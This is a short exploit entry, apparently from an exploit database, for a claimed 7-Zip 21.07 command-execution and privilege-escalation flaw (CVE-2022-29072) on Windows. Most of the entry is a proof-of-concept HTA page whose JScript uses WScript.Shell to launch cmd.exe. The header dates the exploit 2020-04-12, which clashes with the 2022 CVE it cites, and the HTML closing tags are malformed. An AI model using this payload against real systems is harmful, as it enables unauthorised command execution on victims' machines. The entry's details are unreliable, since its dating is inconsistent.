@@ -1,0 +1,22 @@
+# Exploit Title: 7-zip - Code Execution / Local Privilege Escalation
+# Exploit Author:  Kağan Çapar
+# Date: 2020-04-12
+# Vendor homepage: https://www.7-zip.org/
+# Software link: https://www.7-zip.org/a/7z2107-x64.msi
+# Version: 21.07 and all versions
+# Tested On: Windows 10 Pro (x64)
+# References: https://github.com/kagancapar/CVE-2022-29072
+
+# About:
+7-Zip through 21.07 on Windows allows privilege escalation and command execution when a file with the .7z extension is dragged to the Help>Contents area.
+
+# Proof of Concept:
+<html>
+<head>
+<HTA:APPLICATION ID="7zipcodeexec">
+<script language="jscript">
+var c = "cmd.exe";
+new ActiveXObject('WScript.Shell').Run(c);
+</script>
+<head>
+<html>
